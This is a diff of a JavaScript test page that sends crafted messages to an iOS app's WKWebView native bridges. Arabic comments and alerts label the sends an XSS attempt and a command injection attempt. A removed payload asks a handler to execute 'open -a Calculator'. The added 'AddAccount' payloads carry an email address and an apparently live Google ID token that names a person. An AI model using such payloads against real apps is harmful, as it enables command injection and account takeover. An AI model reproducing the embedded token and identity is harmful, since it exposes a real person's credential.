@@ -40,11 +40,15 @@
     function sendTargetAccountLinking() {
       try {
         // نرسل نص فيه كود جافاسكريبت مشفر (XSS محاولة)
-      window.webkit.messageHandlers.TargetAccountLinkingInterfaceHandler.postMessage({
-      // provider: "google",
-      id_token: "eyJhbGciOiJSUzI1NiIsImtpZCI6ImRkNTMwMTIwNGZjMWQ2YTBkNjhjNzgzYTM1Y2M5YzEwYjI1ZTFmNGEiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL2FjY291bnRzLmdvb2dsZS5jb20iLCJhenAiOiI2OTQ1MDU2OTIxNzEtZjRhdDRpN2VpaHBobzZrMjJmb28xN3NkNXE2YWVsNmIuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCJhdWQiOiI2OTQ1MDU2OTIxNzEtMzFjbG9zZjNiY21sdDU5YWV1bGcyajgxZWo2OGo2aGsuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCJzdWIiOiIxMDY2OTQ3NTM5ODk2MTI3MjA5OTIiLCJlbWFpbCI6InRhaGEuaHVzc2Vpbi5vbmUub25lQGdtYWlsLmNvbSIsImVtYWlsX3ZlcmlmaWVkIjp0cnVlLCJhdF9oYXNoIjoiek50VF9UUnRuVGw0akVGM09YNjE4USIsIm5vbmNlIjoiVDF6RWtJcGk1bUlzUlFaUHh2TFdTX3JKMC1iM2Zlc295Vm51cTluZVdVVSIsIm5hbWUiOiJUYWhhIGh1c3NlaW4iLCJwaWN0dXJlIjoiaHR0cHM6Ly9saDMuZ29vZ2xldXNlcmNvbnRlbnQuY29tL2EvQUNnOG9jSnA4ZzV5VUFjQl8zNVJ5QzQxR0ZEc2x4QTNEM2R5dnlLYi1xVEc5ZXpLXzFWOT1zOTYtYyIsImdpdmVuX25hbWUiOiJUYWhhIiwiZmFtaWx5X25hbWUiOiJodXNzZWluIiwiaWF0IjoxNzU0MTA3MjczLCJleHAiOjE3NTQxMTA4NzN9.I0bGDSnD6GONRmOL1Vc9BAaEBHj1431z7gH9tCNGyzAClAIFQjvsCrBqBjYTgDdqykco_uH1s__hz9sOk2GEHCbsPaojgk2_k5AsF5xKULMDJTR1k6OLXajEa7AoUZxWsUtCA9JQYZWWgkmUBjeoLENuO45IQa2etGq3Ds8jcFAWPTrOaNF1IRas3_cT56r4MjJ7qdg0ZUaxyVKyaUTvr1XUepKOlQjpMjC6X2fPNck00Mb8YAPSVeAs-LQ3gpWGBoYONA_6hAGW6nOEKsXQBFoUNziq6uE4uIewMmZUl50Yg6QGkZvNEJZz4tLUwrjfOUgNgtbRwCUD3Iza6qO9IA"
-      // expires_in: "3599"
-});
+    
+
+     window.webkit.messageHandlers.nativeBridge.postMessage({
+     action: "AddAccount",
+     data: {
+     email: "taha.hussein.one.one@gmail.com"
+     }
+    });
+
         alert("✅ Sent XSS ");
       } catch (e) {
         alert("❌ Error: " + e.message);
@@ -53,11 +57,16 @@
 
     function sendAmazonShop() {
       try {
-        // محاولة حقن أمر (لو handler يسمح بتنفيذ أوامر)
-        window.webkit.messageHandlers.AmazonShopExternalInterfaceHandler.postMessage({
-          action: "execute",
-          command: "open -a Calculator"  // أو أي أمر ممكن ينفذه النيتف
-        });
+         window.webkit.messageHandlers.TargetAccountLinkingInterfaceHandler.postMessage({
+      // provider: "google",
+      // id_token: "eyJhbGciOiJSUzI1NiIsImtpZCI6ImRkNTMwMTIwNGZjMWQ2YTBkNjhjNzgzYTM1Y2M5YzEwYjI1ZTFmNGEiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL2FjY291bnRzLmdvb2dsZS5jb20iLCJhenAiOiI2OTQ1MDU2OTIxNzEtZjRhdDRpN2VpaHBobzZrMjJmb28xN3NkNXE2YWVsNmIuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCJhdWQiOiI2OTQ1MDU2OTIxNzEtMzFjbG9zZjNiY21sdDU5YWV1bGcyajgxZWo2OGo2aGsuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCJzdWIiOiIxMDY2OTQ3NTM5ODk2MTI3MjA5OTIiLCJlbWFpbCI6InRhaGEuaHVzc2Vpbi5vbmUub25lQGdtYWlsLmNvbSIsImVtYWlsX3ZlcmlmaWVkIjp0cnVlLCJhdF9oYXNoIjoiek50VF9UUnRuVGw0akVGM09YNjE4USIsIm5vbmNlIjoiVDF6RWtJcGk1bUlzUlFaUHh2TFdTX3JKMC1iM2Zlc295Vm51cTluZVdVVSIsIm5hbWUiOiJUYWhhIGh1c3NlaW4iLCJwaWN0dXJlIjoiaHR0cHM6Ly9saDMuZ29vZ2xldXNlcmNvbnRlbnQuY29tL2EvQUNnOG9jSnA4ZzV5VUFjQl8zNVJ5QzQxR0ZEc2x4QTNEM2R5dnlLYi1xVEc5ZXpLXzFWOT1zOTYtYyIsImdpdmVuX25hbWUiOiJUYWhhIiwiZmFtaWx5X25hbWUiOiJodXNzZWluIiwiaWF0IjoxNzU0MTA3MjczLCJleHAiOjE3NTQxMTA4NzN9.I0bGDSnD6GONRmOL1Vc9BAaEBHj1431z7gH9tCNGyzAClAIFQjvsCrBqBjYTgDdqykco_uH1s__hz9sOk2GEHCbsPaojgk2_k5AsF5xKULMDJTR1k6OLXajEa7AoUZxWsUtCA9JQYZWWgkmUBjeoLENuO45IQa2etGq3Ds8jcFAWPTrOaNF1IRas3_cT56r4MjJ7qdg0ZUaxyVKyaUTvr1XUepKOlQjpMjC6X2fPNck00Mb8YAPSVeAs-LQ3gpWGBoYONA_6hAGW6nOEKsXQBFoUNziq6uE4uIewMmZUl50Yg6QGkZvNEJZz4tLUwrjfOUgNgtbRwCUD3Iza6qO9IA"
+      // expires_in: "3599"
+      action: "AddAccount",
+      data: {
+      id_token: "eyJhbGciOiJSUzI1NiIsImtpZCI6ImRkNTMwMTIwNGZjMWQ2YTBkNjhjNzgzYTM1Y2M5YzEwYjI1ZTFmNGEiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL2FjY291bnRzLmdvb2dsZS5jb20iLCJhenAiOiI2OTQ1MDU2OTIxNzEtZjRhdDRpN2VpaHBobzZrMjJmb28xN3NkNXE2YWVsNmIuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCJhdWQiOiI2OTQ1MDU2OTIxNzEtMzFjbG9zZjNiY21sdDU5YWV1bGcyajgxZWo2OGo2aGsuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCJzdWIiOiIxMDY2OTQ3NTM5ODk2MTI3MjA5OTIiLCJlbWFpbCI6InRhaGEuaHVzc2Vpbi5vbmUub25lQGdtYWlsLmNvbSIsImVtYWlsX3ZlcmlmaWVkIjp0cnVlLCJhdF9oYXNoIjoiek50VF9UUnRuVGw0akVGM09YNjE4USIsIm5vbmNlIjoiVDF6RWtJcGk1bUlzUlFaUHh2TFdTX3JKMC1iM2Zlc295Vm51cTluZVdVVSIsIm5hbWUiOiJUYWhhIGh1c3NlaW4iLCJwaWN0dXJlIjoiaHR0cHM6Ly9saDMuZ29vZ2xldXNlcmNvbnRlbnQuY29tL2EvQUNnOG9jSnA4ZzV5VUFjQl8zNVJ5QzQxR0ZEc2x4QTNEM2R5dnlLYi1xVEc5ZXpLXzFWOT1zOTYtYyIsImdpdmVuX25hbWUiOiJUYWhhIiwiZmFtaWx5X25hbWUiOiJodXNzZWluIiwiaWF0IjoxNzU0MTA3MjczLCJleHAiOjE3NTQxMTA4NzN9.I0bGDSnD6GONRmOL1Vc9BAaEBHj1431z7gH9tCNGyzAClAIFQjvsCrBqBjYTgDdqykco_uH1s__hz9sOk2GEHCbsPaojgk2_k5AsF5xKULMDJTR1k6OLXajEa7AoUZxWsUtCA9JQYZWWgkmUBjeoLENuO45IQa2etGq3Ds8jcFAWPTrOaNF1IRas3_cT56r4MjJ7qdg0ZUaxyVKyaUTvr1XUepKOlQjpMjC6X2fPNck00Mb8YAPSVeAs-LQ3gpWGBoYONA_6hAGW6nOEKsXQBFoUNziq6uE4uIewMmZUl50Yg6QGkZvNEJZz4tLUwrjfOUgNgtbRwCUD3Iza6qO9IA"
+      }
+      
+      });
         alert("✅ Sent command injection payload to AmazonShopExternalInterfaceHandler");
       } catch (e) {
         alert("❌ Error: " + e.message);
